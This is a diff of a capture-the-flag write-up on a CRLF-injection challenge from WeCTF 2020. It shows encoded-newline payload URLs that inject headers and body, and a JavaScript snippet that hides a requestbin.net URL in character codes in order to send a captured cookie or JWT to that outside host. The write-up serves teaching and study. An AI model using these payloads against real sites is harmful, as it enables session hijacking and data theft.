@@ -13,20 +13,17 @@ Note 2: Server is running on a patched version to compensate the NGINX issue. Co
 The [official writeup](https://github.com/shouc/wectf-2020#writeup---urllongener-crlf-injection--cors-misconf)
 takes a much simpler route than we did, but we thought our CORS-free solution was interesting to consider.
 
-When we create a link, we supply the URL that goes in a `Refresh` header sent to its visitors:
+When we create a link, we supply the URL that goes in a `Refresh` header sent to the link's visitors:
 ```python
 location = html.escape(urllib.parse.unquote(location))
 return 302, {"Refresh": "3; url=%s" % location}, "Redirecting you to %s in 3s..." % location
 ```
-This mechanism, unlike an HTTP redirect, prevents us from serving our code under the target origin.
-
 We quickly notice that we control the headers of the redirect response due to insufficient input validation.
 We do this by inserting a URL-encoded newline into the location parameter. For example,
 ```
 http://url.w-va.cf/redirect?location=http://google.com/#%0AContent-Type:%20text/javascript
 ```
 does set the `Content-Type` header as shown. We considered what we could do with this, but did not think of CORS.
-
 Instead, we jumped straight to manipulating the request body, which can be done by inserting two newlines instead of one:
 ```
 http://url.w-va.cf/redirect?location=http://google.com/#%0A%0A<html>body</html>
@@ -36,10 +33,10 @@ Of course, this fails to do the desired thing due to location being `html.escape
 Now, to make things cleaner, we will just forgo the `http://google.com` URL entirely:
 as it turns out, empty `url` in a `Refresh` header causes a simple refresh of the page instead of an error.
 
-We eventually gave up on circumventing the escaping: unsurprisingly, `html.escape` seems to do its job properly.
+We eventually gave up on circumventing the escaping: `html.escape` seems to do its job properly.
 This means that we cannot make the redirect serve an HTML page with a `script` tag.
 But what if we use a server we control to serve a page that _sources a script_ from a redirect URL?
-There is seemingly no obstacle to having JS code in the body. An indeed,
+There is no obstacle to having JS code in the body. And indeed,
 ```html
 <!DOCTYPE html>
 <html lang="en">
@@ -65,7 +62,7 @@ def get_index(req):
         # get such user's array
         result = links[fingerprint]
 ```
-where `make_response` ultimately does this:
+where `make_response` ultimately does this, discarding the timestamp:
 ```python
 def get_authorization(req):
     try:
@@ -82,8 +79,8 @@ function foo() {
 }
 const content = `;foo()//
 ```
-Why write it like this? Because the server-supplied response body also contains all of the payload,
-all the remaining headers and all of the body will be caught into `content`, making the full response this:
+Why write it like this? Because the server-supplied response body also contains all of the payload after
+the remaining headers, so the `Set-Cookie` will be caught into `content`, making the full response this:
 ```
 [...]
 Refresh: 3; url=
@@ -101,13 +98,12 @@ function foo() {
 }
 const content = `;foo()//
 ```
-This is almost what we want, except that we're not allowed single or double quotes for the URL,
-and using backticks would break `content`.
-There may have been a smarter solution, but we ended up just rewriting the code as
+This is almost what we want, except that we're not allowed single or double quotes, and using backticks would break `content`.
+There may have been a smarter solution, but we ended up just rewriting the code:
 ```js
 function f(){a=[104,116,116,112,58,47,47,114,101,113,117,101,115,116,98,105,110,46,110,101,116,47,114,47,49,55,122,50,101,117,56,49,63,99,61];s=a.map(function(c){return String.fromCharCode(c)}).join([]);location=s+btoa(t);}t=`;f()//
 ```
-And this is nearly all there was to it: after getting the JWT, by serving the supplied [index.html](./index.html),
+Now, finally, this is nearly all there was to it: after getting the JWT by serving the supplied [index.html](./index.html),
 we run [request.py](./request.py) which sets the headers needed for the fingerprint.
 
 The last step frustrated us somewhat, as we hadn't considered that we might not need `X-Forwarded-For`.
